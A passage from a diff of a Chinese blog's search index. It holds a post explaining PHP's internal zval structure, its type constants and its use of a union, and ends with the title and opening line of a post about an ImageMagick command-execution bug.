&#123;</span></div><div class="line"><span class="comment">/* Variable information */</span></div><div class="line">zvalue_value value;        <span class="comment">/* value */</span></div><div class="line">zend_uint refcount__gc;   <span class="comment">/* PHP的内存回收机制需要这个值,现在我们并不需要对它特别关注 */</span></div><div class="line">zend_uchar type;    <span class="comment">/* active type */</span></div><div class="line">zend_uchar is_ref__gc;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>保存变量的地方是<code>_zvalue_value</code>,<code>_zvalue_value</code>定义了一个联合体①来储存用户输入的变量</p>
+<p><code>_zvalue_value</code>可以把内存中的值相对应的解释为<code>long</code>、<code>double</code>、<code>str</code>等类型,比较特殊的有三种<code>HashTable *ht（数组）</code>、<code>obj(对象)</code>和<code>*ast(资源)</code></p>
+<p>这个变量是什么类型由<code>zend_uchar type;    /* active type */</code>决定,</p>
+<p><code>type</code>的种类在<strong>Zend/zend.h:583-601</strong>中定义.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">/* data types */</div><div class="line">/* All data types &lt;= IS_BOOL have their constructor/destructors skipped */</div><div class="line">#define IS_NULL        0</div><div class="line">#define IS_LONG        1</div><div class="line">#define IS_DOUBLE    2</div><div class="line">#define IS_BOOL        3</div><div class="line">#define IS_ARRAY    4</div><div class="line">#define IS_OBJECT    5</div><div class="line">#define IS_STRING    6</div><div class="line">#define IS_RESOURCE    7</div><div class="line">#define IS_CONSTANT    8</div><div class="line">#define IS_CONSTANT_AST    9</div><div class="line">#define IS_CALLABLE    10</div><div class="line"></div><div class="line">#define IS_CONSTANT_TYPE_MASK        0x00f</div><div class="line">#define IS_CONSTANT_UNQUALIFIED        0x010</div><div class="line">#define IS_LEXICAL_VAR                0x020</div><div class="line">#define IS_LEXICAL_REF                0x040</div><div class="line">#define IS_CONSTANT_IN_NAMESPACE    0x100</div><div class="line"></div><div class="line">#define IS_CONSTANT_TYPE(type) (((type) &amp; IS_CONSTANT_TYPE_MASK) &gt;= IS_CONSTANT &amp;&amp; ((type) &amp; IS_CONSTANT_TYPE_MASK) &lt;= IS_CONSTANT_AST)</div></pre></td></tr></table></figure>
+<p>PHP中实现转换就是当<code>zval.type = IS_LONG</code>是,就把结构体里的<code>value</code>转换成<code>long</code>型,当<code>zval.type = IS_STRING</code>时,就把结构体里面的<code>value</code>转换成<code>str</code>类型</p>
+<p>明白了以上基础知识就可以来探究<code>zval.type</code>会在哪些场景带来哪些问题了.</p>
+<hr>
+<p>①为什么要用联合体呢?</p>
+<p>在<code>K&amp;R</code>的<code>&lt;&lt;Pointer on C&gt;&gt;</code>中我们可以翻阅到这么一段文字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">联合的声明和结构类似,但它的行为方式却和结构不同.联合的所有成员引用的是内存中相同的位置.当你想在不同的时刻把不同的东西储存在同一个位置的时候,就可以使用联合.</div></pre></td></tr></table></figure>
+<p>联合体可以用来动态的表示同一个内存中的值的类型.假如使用<code>结构体</code>来储存用户输入地变量的话,那么假设用户输入了<code>1</code>,如果想要把<code>1</code>以<code>char</code>,<code>int</code>,<code>double</code>等等来表示的话,就会成倍的增加内存占用.</p>
+<hr>
+]]></content>
+      
+        <categories>
+            
+            <category> 源码分析 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> PHP </tag>
+            
+            <tag> 源码分析 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[ImageMagick另一个命令执行--popen_utf8()函数]]></title>
       <url>/2017/10/10/ImageMagick2/</url>
       <content type="html"><![CDATA[<h2 id="心情杂谈"><a href="#心情杂谈" class="headerlink" title="心情杂谈"></a>心情杂谈</h2><p>哎哎哎,老司机一言不合就爆洞啊,这个洞在之前分析CVE-2016-3714的时候也发现了,结果被捂烂了…心塞塞~那我就写一下当时是怎么发现怎么这个洞…</p>
